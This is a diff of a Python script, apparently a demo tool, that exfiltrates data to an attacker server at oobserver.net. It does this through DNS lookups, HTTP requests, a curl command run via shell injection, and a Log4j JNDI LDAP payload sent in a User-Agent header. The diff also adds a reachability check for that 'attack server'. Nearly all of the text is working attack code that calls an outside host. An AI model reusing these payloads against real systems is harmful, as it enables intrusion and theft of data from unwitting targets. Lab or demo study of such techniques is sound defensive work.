@@ -3,12 +3,24 @@ import subprocess
 import dns.resolver
 
 # Configuration
-DEMO_WEBSITE_URL = "http://netutils"
-ATTACKER_SERVER_URL = "http://oobserver.net:5000"  # Update this URL to point to your Flask server
+DEMO_WEBSITE_URL = "http://your-demo-website.com"
+ATTACKER_SERVER_URL = "http://oobserver.net:5000"  # Ensure this is pointing to your attack server on port 5000
+
+def check_server():
+    """Check if the attack server is reachable."""
+    try:
+        response = requests.get(f"{ATTACKER_SERVER_URL}/log?data=test")
+        if response.status_code == 200:
+            print("Attack server is reachable.")
+        else:
+            print(f"Attack server returned status code: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to connect to the attack server: {e}")
+        exit(1)
 
 def dns_exfiltration(data):
     """Perform DNS exfiltration."""
-    domain = f"{data}.{ATTACKER_SERVER_URL}"
+    domain = f"{data}.oobserver.net"  # Example domain, adjust as needed
     try:
         dns.resolver.resolve(domain, 'A')
     except Exception as e:
@@ -25,7 +37,7 @@ def http_exfiltration(data):
 def command_injection(data):
     """Perform command injection."""
     try:
-        cmd = f"ping -c 1 {ATTACKER_SERVER_URL}/{data}"
+        cmd = f"curl {ATTACKER_SERVER_URL}/log?data={data}"
         subprocess.run(cmd, shell=True)
     except Exception as e:
         print(f"Command injection error: {e}")
@@ -67,7 +79,7 @@ def ssrf_exfiltration(data):
 
 def log4j_exfiltration(data):
     """Perform Log4j exfiltration."""
-    payload = f"${{jndi:ldap://{ATTACKER_SERVER_URL}/a}}"
+    payload = f"${{jndi:ldap://oobserver.net:5000/a}}"
     headers = {'User-Agent': payload}
     try:
         requests.get(DEMO_WEBSITE_URL, headers=headers)
@@ -76,6 +88,9 @@ def log4j_exfiltration(data):
 
 def main():
     data_to_exfiltrate = "sensitive_data"
+
+    print("Checking if attack server is reachable...")
+    check_server()
 
     print("Performing DNS Exfiltration...")
     dns_exfiltration(data_to_exfiltrate)
